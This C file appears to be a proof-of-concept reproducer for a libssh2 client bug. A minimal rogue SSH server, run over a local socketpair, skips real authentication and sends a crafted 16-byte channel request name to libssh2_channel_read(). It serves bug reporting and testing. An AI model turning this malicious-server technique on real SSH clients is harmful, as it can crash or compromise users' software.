/* Drive libssh2_channel_read() with a normal channel request whose
 * name is 16 bytes. That length is permitted by RFC 4254; only the
 * request name differs from any other ignored channel request.
 */
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/wait.h>

#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/rand.h>

#include <libssh2.h>

#define MACLEN 32
#define BLK 16

static int debug_on;

#define DBG(...) do { if(debug_on) fprintf(stderr, __VA_ARGS__); } while(0)

static void die(const char *what)
{
    fprintf(stderr, "server: %s\n", what);
    _exit(2);
}

static uint32_t ru32(const unsigned char *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

static void wu32(unsigned char *p, uint32_t v)
{
    p[0] = (unsigned char)(v >> 24);
    p[1] = (unsigned char)(v >> 16);
    p[2] = (unsigned char)(v >> 8);
    p[3] = (unsigned char)v;
}

static int read_full(int fd, unsigned char *buf, size_t n)
{
    size_t off = 0;
    while(off < n) {
        ssize_t r = read(fd, buf + off, n - off);
        if(r < 0) {
            if(errno == EINTR)
                continue;
            return -1;
        }
        if(r == 0)
            return -1;
        off += (size_t)r;
    }
    return 0;
}

static int write_full(int fd, const unsigned char *buf, size_t n)
{
    size_t off = 0;
    while(off < n) {
        ssize_t r = write(fd, buf + off, n - off);
        if(r < 0) {
            if(errno == EINTR)
                continue;
            return -1;
        }
        off += (size_t)r;
    }
    return 0;
}

struct crypto {
    int on;
    uint32_t send_seq;
    uint32_t recv_seq;
    EVP_CIPHER_CTX *enc;
    EVP_CIPHER_CTX *dec;
    unsigned char mac_s2c[MACLEN];
    unsigned char mac_c2s[MACLEN];
};

static int read_banner(int fd, char *out, size_t outsz)
{
    size_t n = 0;
    while(n + 1 < outsz) {
        unsigned char c;
        if(read_full(fd, &c, 1))
            return -1;
        if(c == '\n')
            break;
        if(c != '\r')
            out[n++] = (char)c;
    }
    out[n] = '\0';
    return n > 0 ? 0 : -1;
}

static size_t pad_len(size_t payload, size_t block)
{
    size_t pad = block - ((5 + payload) % block);
    if(pad < 4)
        pad += block;
    return pad;
}

/* Build an SSH binary packet around payload. If crypto is on, encrypt and MAC. */
static int send_packet(int fd, struct crypto *cr,
                       const unsigned char *payload, size_t plen)
{
    size_t block = cr->on ? BLK : 8;
    size_t pad = pad_len(plen, block);
    size_t pktlen = 1 + plen + pad;
    size_t plain_len = 4 + pktlen;
    unsigned char *plain = calloc(1, plain_len + MACLEN);
    unsigned char mac[MACLEN];
    int rc = -1;

    if(!plain)
        return -1;
    wu32(plain, (uint32_t)pktlen);
    plain[4] = (unsigned char)pad;
    memcpy(plain + 5, payload, plen);
    if(RAND_bytes(plain + 5 + plen, (int)pad) != 1)
        goto done;

    if(cr->on) {
        int outl = 0;
        unsigned char seqb[4];
        unsigned int maclen = MACLEN;
        unsigned char *enc = malloc(plain_len);
        unsigned char *msg = malloc(4 + plain_len);
        if(!enc || !msg) {
            free(enc);
            free(msg);
            goto done;
        }
        if(EVP_EncryptUpdate(cr->enc, enc, &outl, plain, (int)plain_len) != 1 ||
           (size_t)outl != plain_len) {
            free(enc);
            free(msg);
            goto done;
        }
        wu32(seqb, cr->send_seq);
        memcpy(msg, seqb, 4);
        memcpy(msg + 4, plain, plain_len);
        if(HMAC(EVP_sha256(), cr->mac_s2c, MACLEN, msg, 4 + plain_len,
                mac, &maclen) == NULL || maclen != MACLEN) {
            free(enc);
            free(msg);
            goto done;
        }
        free(msg);
        if(write_full(fd, enc, plain_len) || write_full(fd, mac, MACLEN)) {
            free(enc);
            goto done;
        }
        free(enc);
    }
    else {
        if(write_full(fd, plain, plain_len))
            goto done;
    }
    cr->send_seq++;
    rc = 0;
done:
    free(plain);
    return rc;
}

static int recv_packet(int fd, struct crypto *cr,
                       unsigned char **payload, size_t *plen)
{
    unsigned char first[BLK];
    unsigned char *body = NULL;
    unsigned char *plain = NULL;
    size_t plain_len;
    uint32_t pktlen;
    unsigned char pad;
    size_t pay;
    unsigned char mac[MACLEN];
    int rc = -1;

    if(!cr->on) {
        unsigned char lenb[4];
        if(read_full(fd, lenb, 4))
            return -1;
        pktlen = ru32(lenb);
        if(pktlen < 1 || pktlen > 35000)
            return -1;
        body = malloc(pktlen);
        if(!body || read_full(fd, body, pktlen))
            goto done;
        pad = body[0];
        if(pad > pktlen - 1)
            goto done;
        pay = pktlen - 1 - pad;
        *payload = malloc(pay ? pay : 1);
        if(!*payload)
            goto done;
        if(pay)
            memcpy(*payload, body + 1, pay);
        *plen = pay;
        cr->recv_seq++;
        rc = 0;
        goto done;
    }

    if(read_full(fd, first, BLK))
        return -1;
    {
        int outl = 0;
        unsigned char decfirst[BLK];
        if(EVP_EncryptUpdate(cr->dec, decfirst, &outl, first, BLK) != 1)
            return -1;
        memcpy(first, decfirst, BLK);
    }
    pktlen = ru32(first);
    if(pktlen < 1 || pktlen > 35000)
        return -1;
    plain_len = 4 + pktlen;
    if(plain_len < BLK || (plain_len % BLK) != 0)
        return -1;
    body = malloc(plain_len - BLK + MACLEN);
    if(!body || read_full(fd, body, plain_len - BLK + MACLEN))
        goto done;
    {
        int outl = 0;
        unsigned char *dec = malloc(plain_len - BLK);
        if(!dec)
            goto done;
        if(EVP_EncryptUpdate(cr->dec, dec, &outl, body,
                             (int)(plain_len - BLK)) != 1 ||
           (size_t)outl != plain_len - BLK) {
            free(dec);
            goto done;
        }
        memcpy(body, dec, plain_len - BLK);
        free(dec);
    }
    plain = malloc(plain_len);
    if(!plain)
        goto done;
    memcpy(plain, first, BLK);
    memcpy(plain + BLK, body, plain_len - BLK);

    {
        unsigned char seqb[4];
        unsigned char *msg = malloc(4 + plain_len);
        unsigned int maclen = MACLEN;
        unsigned char expect[MACLEN];
        if(!msg)
            goto done;
        wu32(seqb, cr->recv_seq);
        memcpy(msg, seqb, 4);
        memcpy(msg + 4, plain, plain_len);
        if(HMAC(EVP_sha256(), cr->mac_c2s, MACLEN, msg, 4 + plain_len,
                expect, &maclen) == NULL) {
            free(msg);
            goto done;
        }
        free(msg);
        memcpy(mac, body + (plain_len - BLK), MACLEN);
        if(maclen != MACLEN || memcmp(expect, mac, MACLEN) != 0) {
            DBG("mac mismatch seq %u\n", cr->recv_seq);
            goto done;
        }
    }

    pad = plain[4];
    if(pad > pktlen - 1)
        goto done;
    pay = pktlen - 1 - pad;
    *payload = malloc(pay ? pay : 1);
    if(!*payload)
        goto done;
    if(pay)
        memcpy(*payload, plain + 5, pay);
    *plen = pay;
    cr->recv_seq++;
    rc = 0;
done:
    free(body);
    free(plain);
    return rc;
}

static void put_str(unsigned char **p, const void *s, size_t n)
{
    wu32(*p, (uint32_t)n);
    *p += 4;
    if(n) {
        memcpy(*p, s, n);
        *p += n;
    }
}

static int take_str(const unsigned char **p, const unsigned char *end,
                    const unsigned char **s, size_t *n)
{
    uint32_t len;
    if(*p + 4 > end)
        return -1;
    len = ru32(*p);
    *p += 4;
    if(*p + len > end)
        return -1;
    *s = *p;
    *n = len;
    *p += len;
    return 0;
}

static void hash_str(EVP_MD_CTX *ctx, const void *s, size_t n)
{
    unsigned char lb[4];
    wu32(lb, (uint32_t)n);
    EVP_DigestUpdate(ctx, lb, 4);
    if(n)
        EVP_DigestUpdate(ctx, s, n);
}

static EVP_PKEY *gen_key(const char *type)
{
    return EVP_PKEY_Q_keygen(NULL, NULL, type);
}

static int raw_pub(EVP_PKEY *k, unsigned char *out, size_t n)
{
    size_t len = n;
    return EVP_PKEY_get_raw_public_key(k, out, &len) == 1 && len == n ? 0 : -1;
}

static int x25519_shared(EVP_PKEY *ours, const unsigned char *peer, size_t peerlen,
                         unsigned char out[32])
{
    EVP_PKEY *pk = EVP_PKEY_new_raw_public_key(EVP_PKEY_X25519, NULL, peer, peerlen);
    EVP_PKEY_CTX *ctx;
    size_t len = 32;
    int rc = -1;
    if(!pk)
        return -1;
    ctx = EVP_PKEY_CTX_new(ours, NULL);
    if(!ctx)
        goto done;
    if(EVP_PKEY_derive_init(ctx) <= 0)
        goto done;
    if(EVP_PKEY_derive_set_peer(ctx, pk) <= 0)
        goto done;
    if(EVP_PKEY_derive(ctx, out, &len) <= 0 || len != 32)
        goto done;
    rc = 0;
done:
    EVP_PKEY_CTX_free(ctx);
    EVP_PKEY_free(pk);
    return rc;
}

/* Minimal mpint of a fixed 32-byte big-endian integer (leading zeros stripped). */
static size_t mpint_encode(const unsigned char in[32], unsigned char *out)
{
    const unsigned char *p = in;
    size_t n = 32;
    int sign;
    while(n > 0 && *p == 0) {
        p++;
        n--;
    }
    if(n == 0) {
        wu32(out, 0);
        return 4;
    }
    sign = (p[0] & 0x80) ? 1 : 0;
    wu32(out, (uint32_t)(n + (size_t)sign));
    if(sign)
        out[4] = 0;
    memcpy(out + 4 + sign, p, n);
    return 4 + (size_t)sign + n;
}

static int derive(const unsigned char *k, size_t klen,
                  const unsigned char h[32], char letter,
                  unsigned char *out, size_t need)
{
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();
    unsigned char dig[32];
    unsigned int dlen = 32;
    int rc = -1;
    if(!ctx)
        return -1;
    if(EVP_DigestInit_ex(ctx, EVP_sha256(), NULL) != 1)
        goto done;
    EVP_DigestUpdate(ctx, k, klen);
    EVP_DigestUpdate(ctx, h, 32);
    EVP_DigestUpdate(ctx, &letter, 1);
    EVP_DigestUpdate(ctx, h, 32); /* session id == H */
    if(EVP_DigestFinal_ex(ctx, dig, &dlen) != 1)
        goto done;
    if(need > dlen)
        goto done;
    memcpy(out, dig, need);
    rc = 0;
done:
    EVP_MD_CTX_free(ctx);
    return rc;
}

static int enable_crypto(struct crypto *cr, const unsigned char *k, size_t klen,
                         const unsigned char h[32])
{
    unsigned char iv_c2s[16], iv_s2c[16], key_c2s[16], key_s2c[16];
    if(derive(k, klen, h, 'A', iv_c2s, 16) ||
       derive(k, klen, h, 'B', iv_s2c, 16) ||
       derive(k, klen, h, 'C', key_c2s, 16) ||
       derive(k, klen, h, 'D', key_s2c, 16) ||
       derive(k, klen, h, 'E', cr->mac_c2s, 32) ||
       derive(k, klen, h, 'F', cr->mac_s2c, 32))
        return -1;
    cr->dec = EVP_CIPHER_CTX_new();
    cr->enc = EVP_CIPHER_CTX_new();
    if(!cr->dec || !cr->enc)
        return -1;
    /* CTR encrypt and decrypt are the same operation. */
    if(EVP_EncryptInit_ex(cr->dec, EVP_aes_128_ctr(), NULL, key_c2s, iv_c2s) != 1)
        return -1;
    if(EVP_EncryptInit_ex(cr->enc, EVP_aes_128_ctr(), NULL, key_s2c, iv_s2c) != 1)
        return -1;
    EVP_CIPHER_CTX_set_padding(cr->dec, 0);
    EVP_CIPHER_CTX_set_padding(cr->enc, 0);
    cr->on = 1;
    return 0;
}

static const char *kex_list = "curve25519-sha256";
static const char *hk_list = "ssh-ed25519";
static const char *enc_list = "aes128-ctr";
static const char *mac_list = "hmac-sha2-256";
static const char *cmp_list = "none";
static const char server_banner[] = "SSH-2.0-poc_exit";

static int run_server(int fd)
{
    struct crypto cr;
    char client_banner[256];
    unsigned char *ic = NULL;
    size_t ic_len = 0;
    unsigned char *pkt = NULL;
    size_t pkt_len = 0;
    unsigned char is_buf[512];
    unsigned char *sp;
    EVP_PKEY *host = NULL;
    EVP_PKEY *eph = NULL;
    unsigned char hostpub[32], ephpub[32];
    unsigned char hostblob[51];
    unsigned char *hb;
    unsigned char kbin[40];
    size_t klen;
    unsigned char H[32];
    unsigned char sig[64];
    size_t siglen = 64;
    uint32_t client_chan = 0;
    /* 16-byte request name: in-contract channel request, not exit-status. */
    static const char reqname[] = "keepalive@libssh";
    int i;

    memset(&cr, 0, sizeof(cr));
    if(strlen(reqname) != 16)
        die("request name length");

    if(read_banner(fd, client_banner, sizeof(client_banner)))
        die("banner");
    DBG("client banner %s\n", client_banner);
    {
        char line[80];
        snprintf(line, sizeof(line), "%s\r\n", server_banner);
        if(write_full(fd, (unsigned char *)line, strlen(line)))
            die("send banner");
    }

    if(recv_packet(fd, &cr, &ic, &ic_len) || !ic_len || ic[0] != 20)
        die("kexinit");
    DBG("got kexinit %zu\n", ic_len);

    sp = is_buf;
    *sp++ = 20;
    if(RAND_bytes(sp, 16) != 1)
        die("cookie");
    sp += 16;
    put_str(&sp, kex_list, strlen(kex_list));
    put_str(&sp, hk_list, strlen(hk_list));
    put_str(&sp, enc_list, strlen(enc_list));
    put_str(&sp, enc_list, strlen(enc_list));
    put_str(&sp, mac_list, strlen(mac_list));
    put_str(&sp, mac_list, strlen(mac_list));
    put_str(&sp, cmp_list, strlen(cmp_list));
    put_str(&sp, cmp_list, strlen(cmp_list));
    put_str(&sp, "", 0);
    put_str(&sp, "", 0);
    *sp++ = 0;
    wu32(sp, 0);
    sp += 4;
    if(send_packet(fd, &cr, is_buf, (size_t)(sp - is_buf)))
        die("send kexinit");

    if(recv_packet(fd, &cr, &pkt, &pkt_len) || !pkt_len || pkt[0] != 30)
        die("ecdh init");
    {
        const unsigned char *p = pkt + 1;
        const unsigned char *end = pkt + pkt_len;
        const unsigned char *qc;
        size_t qc_len;
        unsigned char shared[32];
        unsigned char sigblob[83];
        unsigned char *sb;
        unsigned char reply[256];
        unsigned char *rp;
        EVP_MD_CTX *hctx;
        EVP_MD_CTX *sctx;

        if(take_str(&p, end, &qc, &qc_len) || qc_len != 32)
            die("client pubkey");
        host = gen_key("ED25519");
        eph = gen_key("X25519");
        if(!host || !eph)
            die("keygen");
        if(raw_pub(host, hostpub, 32) || raw_pub(eph, ephpub, 32))
            die("raw pub");
        if(x25519_shared(eph, qc, 32, shared))
            die("x25519");
        klen = mpint_encode(shared, kbin);

        hb = hostblob;
        put_str(&hb, "ssh-ed25519", 11);
        put_str(&hb, hostpub, 32);

        hctx = EVP_MD_CTX_new();
        if(!hctx || EVP_DigestInit_ex(hctx, EVP_sha256(), NULL) != 1)
            die("hash init");
        hash_str(hctx, client_banner, strlen(client_banner));
        hash_str(hctx, server_banner, strlen(server_banner));
        hash_str(hctx, ic, ic_len);
        hash_str(hctx, is_buf, (size_t)(sp - is_buf));
        hash_str(hctx, hostblob, 51);
        hash_str(hctx, qc, 32);
        hash_str(hctx, ephpub, 32);
        EVP_DigestUpdate(hctx, kbin, klen);
        if(EVP_DigestFinal_ex(hctx, H, NULL) != 1)
            die("hash final");
        EVP_MD_CTX_free(hctx);

        sctx = EVP_MD_CTX_new();
        if(!sctx || EVP_DigestSignInit(sctx, NULL, NULL, NULL, host) != 1)
            die("sign init");
        if(EVP_DigestSign(sctx, sig, &siglen, H, 32) != 1 || siglen != 64)
            die("sign");
        EVP_MD_CTX_free(sctx);

        sb = sigblob;
        put_str(&sb, "ssh-ed25519", 11);
        put_str(&sb, sig, 64);

        rp = reply;
        *rp++ = 31;
        put_str(&rp, hostblob, 51);
        put_str(&rp, ephpub, 32);
        put_str(&rp, sigblob, 83);
        if(send_packet(fd, &cr, reply, (size_t)(rp - reply)))
            die("send reply");
        free(pkt);
        pkt = NULL;
    }

    /* Client sends NEWKEYS first, then waits for ours. */
    if(recv_packet(fd, &cr, &pkt, &pkt_len) || !pkt_len || pkt[0] != 21)
        die("client newkeys");
    free(pkt);
    pkt = NULL;
    {
        unsigned char nk = 21;
        if(send_packet(fd, &cr, &nk, 1))
            die("send newkeys");
    }
    if(enable_crypto(&cr, kbin, klen, H))
        die("crypto");
    DBG("crypto on, send_seq %u recv_seq %u\n", cr.send_seq, cr.recv_seq);

    if(recv_packet(fd, &cr, &pkt, &pkt_len) || !pkt_len || pkt[0] != 5)
        die("service");
    DBG("service req\n");
    free(pkt);
    pkt = NULL;
    {
        unsigned char acc[1 + 4 + 12];
        unsigned char *p = acc;
        *p++ = 6;
        put_str(&p, "ssh-userauth", 12);
        if(send_packet(fd, &cr, acc, (size_t)(p - acc)))
            die("service accept");
    }

    if(recv_packet(fd, &cr, &pkt, &pkt_len) || !pkt_len || pkt[0] != 50)
        die("userauth");
    DBG("userauth %zu\n", pkt_len);
    free(pkt);
    pkt = NULL;
    {
        unsigned char ok = 52;
        if(send_packet(fd, &cr, &ok, 1))
            die("auth ok");
    }

    if(recv_packet(fd, &cr, &pkt, &pkt_len) || !pkt_len || pkt[0] != 90)
        die("channel open");
    {
        const unsigned char *p = pkt + 1;
        const unsigned char *end = pkt + pkt_len;
        const unsigned char *typ;
        size_t typ_len;
        if(take_str(&p, end, &typ, &typ_len) || p + 4 > end)
            die("open parse");
        client_chan = ru32(p);
        DBG("client chan %u\n", client_chan);
    }
    free(pkt);
    pkt = NULL;
    {
        unsigned char conf[1 + 16];
        unsigned char *p = conf;
        *p++ = 91;
        wu32(p, client_chan);
        p += 4;
        wu32(p, 1); /* sender channel */
        p += 4;
        wu32(p, 32768);
        p += 4;
        wu32(p, 32768);
        p += 4;
        if(send_packet(fd, &cr, conf, (size_t)(p - conf)))
            die("open confirm");
    }

    /* CHANNEL_REQUEST, want_reply = 0, name length 16. */
    {
        unsigned char req[1 + 4 + 4 + 16 + 1];
        unsigned char *p = req;
        *p++ = 98;
        wu32(p, client_chan);
        p += 4;
        put_str(&p, reqname, 16);
        *p++ = 0;
        if(send_packet(fd, &cr, req, (size_t)(p - req)))
            die("request");
    }
    {
        unsigned char m[5];
        m[0] = 96; /* EOF */
        wu32(m + 1, client_chan);
        if(send_packet(fd, &cr, m, 5))
            die("eof");
        m[0] = 97; /* CLOSE */
        if(send_packet(fd, &cr, m, 5))
            die("close");
    }

    /* Drain whatever the client still sends, then exit. */
    for(i = 0; i < 8; i++) {
        if(recv_packet(fd, &cr, &pkt, &pkt_len))
            break;
        DBG("extra msg %u len %zu\n", pkt[0], pkt_len);
        free(pkt);
        pkt = NULL;
    }

    EVP_PKEY_free(host);
    EVP_PKEY_free(eph);
    EVP_CIPHER_CTX_free(cr.enc);
    EVP_CIPHER_CTX_free(cr.dec);
    free(ic);
    return 0;
}

static int run_client(int fd)
{
    LIBSSH2_SESSION *session;
    LIBSSH2_CHANNEL *channel;
    char buf[256];
    char *errmsg = NULL;
    int rc;

    if(libssh2_init(0) != 0) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }
    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "session_init failed\n");
        return 2;
    }
    libssh2_session_set_blocking(session, 1);
    rc = libssh2_session_handshake(session, fd);
    if(rc) {
        libssh2_session_last_error(session, &errmsg, NULL, 0);
        fprintf(stderr, "handshake failed: %d %s\n", rc, errmsg ? errmsg : "");
        return 2;
    }
    (void)libssh2_userauth_list(session, "user", 4);
    if(!libssh2_userauth_authenticated(session)) {
        libssh2_session_last_error(session, &errmsg, NULL, 0);
        fprintf(stderr, "auth failed: %s\n", errmsg ? errmsg : "");
        return 2;
    }
    channel = libssh2_channel_open_session(session);
    if(!channel) {
        libssh2_session_last_error(session, &errmsg, NULL, 0);
        fprintf(stderr, "channel open failed: %s\n", errmsg ? errmsg : "");
        return 2;
    }

    /* Public read path. The server's channel request is consumed here
       (or while opening, if it was already buffered). */
    rc = (int)libssh2_channel_read(channel, buf, sizeof(buf));
    if(rc < 0 && rc != LIBSSH2_ERROR_EAGAIN) {
        libssh2_session_last_error(session, &errmsg, NULL, 0);
        fprintf(stderr, "channel read: %d %s\n", rc, errmsg ? errmsg : "");
        return 2;
    }
    (void)libssh2_channel_has_exit_status(channel);
    libssh2_channel_free(channel);
    libssh2_session_disconnect(session, "done");
    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}

int main(void)
{
    int sv[2];
    pid_t pid;

    debug_on = getenv("POC_DEBUG") != NULL;
    signal(SIGPIPE, SIG_IGN);
    alarm(15);

    if(socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
        perror("socketpair");
        return 2;
    }
    pid = fork();
    if(pid < 0) {
        perror("fork");
        return 2;
    }
    if(pid == 0) {
        close(sv[0]);
        if(run_server(sv[1]))
            _exit(2);
        _exit(0);
    }
    close(sv[1]);
    return run_client(sv[0]);
}
